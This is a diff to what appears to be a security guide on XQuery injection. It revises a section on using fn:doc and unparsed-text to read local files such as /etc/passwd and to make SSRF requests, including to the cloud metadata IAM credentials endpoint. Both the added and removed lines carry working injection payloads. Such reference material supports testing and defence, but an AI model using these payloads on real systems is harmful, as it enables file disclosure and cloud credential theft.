@@ -15,21 +15,22 @@ Once an injection reaches expression position, the attacker can call any functio
 
 ## Standard document and text functions
 
-`fn:doc()` and `fn:collection()` resolve a URI and parse it as XML. An injected call pointed at a `file://` URI reads a local XML document, and one pointed at an `http://` URI turns the server into an SSRF proxy:
+`fn:doc()` and `fn:collection()` resolve a URI and parse the response as XML, so they read XML documents from disk and reach any `http://` URI the server can, acting as an SSRF proxy for XML endpoints:
 
 ```xquery
-' or doc('file:///etc/hostname')//text() or '
-doc('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+' or doc('file:///opt/app/config.xml')//text() or '
+doc('http://internal-admin.svc.local/users.xml')
 ```
 
-The cloud metadata endpoint is a frequent target because the response flows back through the query result. `fn:doc()` requires well-formed XML, so for non-XML files `fn:unparsed-text()` and `fn:unparsed-text-lines()` are the better primitives, returning raw bytes as a string:
+Because `fn:doc()` requires well-formed XML, plain-text and JSON targets (most Linux config files, `/etc/hostname`, and the cloud metadata responses) make it abort with a parse error. For those, `fn:unparsed-text()` and `fn:unparsed-text-lines()` return the raw bytes as a string and are the right primitive:
 
 ```xquery
 unparsed-text('file:///etc/passwd')
-unparsed-text('/opt/app/config/secrets.env')
+unparsed-text('file:///etc/hostname')
+unparsed-text('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
 ```
 
-Both also accept remote URIs, giving a second SSRF channel and an exfiltration sink that embeds attacker-chosen content in the output. `fn:json-doc()` and `fn:parse-json()` behave similarly for JSON endpoints.
+The cloud metadata endpoint is a frequent target because the response flows straight back through the query result. Both functions also accept remote URIs, giving an SSRF channel and an exfiltration sink that embeds attacker-chosen content in the output. `fn:json-doc()` and `fn:parse-json()` handle JSON endpoints similarly.
 
 ## Vendor file modules
 
